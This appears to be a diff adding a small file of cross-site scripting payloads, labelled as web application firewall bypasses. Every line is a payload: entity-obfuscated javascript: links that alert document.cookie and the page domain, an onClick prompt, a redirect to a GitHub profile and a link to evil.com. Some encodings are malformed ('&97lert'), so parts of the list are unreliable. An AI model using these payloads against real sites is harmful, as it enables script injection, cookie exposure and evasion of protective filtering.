@@ -1,0 +1,8 @@
+#WAF Bypass Paylaods
+
+<A HREF="https://evil.com">Click Here </A>
+<button onClick="prompt(1337)">Submit</button>
+<a aa aaa aaaa aaaaa href=j&#97v&#97script&#x3A;&97lert(1337)>ClickMe
+<a aa aaa aaaa aaaaa href=j&#97v&#97script&#x3A;&97lert(document.cookie)>ClickMe
+<a href="j&#97;vascript&#x3A;&#97;lert('Rivek Raj Tamang WAF Bypass' + document.domain + '\nCookie: ' + document.cookie);
+window&#46;location&#46;href='https://github.com/rivek619';">ClickMe</a>
